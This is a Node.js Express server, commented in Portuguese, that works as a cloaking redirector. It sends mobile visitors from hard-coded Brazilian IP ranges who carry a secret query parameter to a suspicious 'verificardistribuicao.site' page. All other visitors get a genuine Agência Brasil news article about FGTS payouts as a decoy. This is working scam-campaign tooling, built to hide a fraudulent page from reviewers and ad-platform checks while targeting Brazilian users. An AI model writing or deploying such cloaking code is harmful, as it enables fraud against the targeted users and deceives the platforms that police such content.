const express = require("express");
const MobileDetect = require("mobile-detect");
const app = express();
const port = process.env.PORT || 3000;

// Configurações das páginas
const whitePage =
  process.env.WHITE_PAGE ||
  "https://agenciabrasil.ebc.com.br/radioagencia-nacional/economia/audio/2024-08/trabalhadores-vao-receber-parte-do-lucro-de-r-152-bilhoes-do-fgts";
const blackPage =
  process.env.BLACK_PAGE ||
  "https://verificardistribuicao.site/rosinha-oficial-berlim/";

// Parâmetros de segurança
const securityParamName = process.env.SECURITY_PARAM_NAME || "JS1CLdcHVbKA";
const securityParamValue = process.env.SECURITY_PARAM_VALUE || "LBowyKAwmgeO";

// Lista de IPs brasileiros (exemplo com alguns ranges comuns)
const brRanges = [
  // Ranges de IPs brasileiros mais comuns
  { start: "177.0.0.0", end: "177.255.255.255" }, // Range NET/Claro
  { start: "179.0.0.0", end: "179.255.255.255" }, // Range Vivo
  { start: "186.192.0.0", end: "186.255.255.255" }, // Range diversos ISPs BR
  { start: "187.0.0.0", end: "187.255.255.255" }, // Range diversos ISPs BR
  { start: "189.0.0.0", end: "189.255.255.255" }, // Range diversos ISPs BR
  { start: "191.0.0.0", end: "191.255.255.255" }, // Range diversos ISPs BR
  { start: "200.128.0.0", end: "200.255.255.255" }, // Range diversos ISPs BR
  { start: "201.0.0.0", end: "201.255.255.255" }, // Range diversos ISPs BR
];

// Função para converter IP em número
function ipToLong(ip) {
  return (
    ip.split(".").reduce((acc, octet) => (acc << 8) + parseInt(octet), 0) >>> 0
  );
}

// Função para verificar se IP está em um range
function isIpInRange(ip, range) {
  const ipLong = ipToLong(ip);
  const startLong = ipToLong(range.start);
  const endLong = ipToLong(range.end);
  return ipLong >= startLong && ipLong <= endLong;
}

// Função para verificar se IP é do Brasil
function isIpFromBrazil(ip) {
  return brRanges.some((range) => isIpInRange(ip, range));
}

// Função para obter IP real do cliente
function getClientIp(req) {
  // Lista de headers que podem conter o IP real
  const headers = [
    "cf-connecting-ip", // Cloudflare
    "x-real-ip", // Nginx
    "x-forwarded-for", // Padrão para proxies
    "x-client-ip", // Apache
    "forwarded", // RFC 7239
  ];

  for (const header of headers) {
    const value = req.headers[header];
    if (value) {
      // Pega o primeiro IP da lista (mais confiável)
      const ip = value.split(",")[0].trim();
      if (ip && /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(ip)) {
        return ip;
      }
    }
  }

  return req.connection.remoteAddress?.replace("::ffff:", "") || "0.0.0.0";
}

// Middleware principal
app.get("*", async (req, res) => {
  try {
    // Detectar dispositivo móvel
    const md = new MobileDetect(req.headers["user-agent"]);
    const isMobile = md.mobile() !== null;

    // Obter IP real e verificar se é do Brasil
    const ip = getClientIp(req);
    const isFromBrazil = isIpFromBrazil(ip);

    // Verificar parâmetros de segurança
    const paramValid = req.query[securityParamName] === securityParamValue;

    // Verificar todas as condições
    const shouldShowBlackPage = isMobile && isFromBrazil && paramValid;

    // Redirecionar para a página apropriada
    const targetUrl = shouldShowBlackPage ? blackPage : whitePage;
    const fullUrl = `${targetUrl}?${new URLSearchParams(req.query).toString()}`;

    res.redirect(fullUrl);
  } catch (error) {
    console.error("Erro:", error);
    res.redirect(whitePage);
  }
});

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
